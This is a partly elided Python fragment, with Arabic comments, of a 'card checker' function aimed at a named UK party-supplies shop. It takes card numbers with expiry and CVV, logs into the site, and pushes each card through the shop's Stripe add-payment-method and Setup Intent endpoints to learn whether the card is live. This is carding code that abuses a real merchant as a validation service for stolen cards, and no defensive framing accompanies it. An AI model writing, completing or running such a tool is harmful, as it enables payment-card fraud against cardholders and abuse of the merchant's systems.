...
def Stripe3(ccx):
    """
    فحص بطاقة على funpartysupplies.co.uk (Stripe - Auth)
    ccx: رقم|شهر|سنة|cvv
    """
    try:
        # ===== تجزئة البطاقة =====
        ...
        #print("\n[1/7] فتح صفحة الحساب...")
        headers = {
            'authority': 'www.funpartysupplies.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': user,
        }
        response = r.get('https://www.funpartysupplies.co.uk/my-account/', headers=headers)
        ...
        headers = {
            ...
            'origin': 'https://www.funpartysupplies.co.uk',
            'user-agent': user,
        }
        ...
        response = r.post('https://www.funpartysupplies.co.uk/my-account/', data=data, headers=headers)
        ...
        response = r.get('https://www.funpartysupplies.co.uk/my-account/add-payment-method/', headers=headers)
        #print(f"    ✅ HTTP {response.status_code}")
        ...
        #print("\n[6/7] تأكيد Setup Intent...")
        headers = {
            'authority': 'www.funpartysupplies.co.uk',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.funpartysupplies.co.uk',
            'referer': 'https://www.funpartysupplies.co.uk/my-account/add-payment-method/',
            'user-agent': user,
        ...
        response = r.post('https://www.funpartysupplies.co.uk/wp-admin/admin-ajax.php', data=data, headers=headers)
        text = response.text
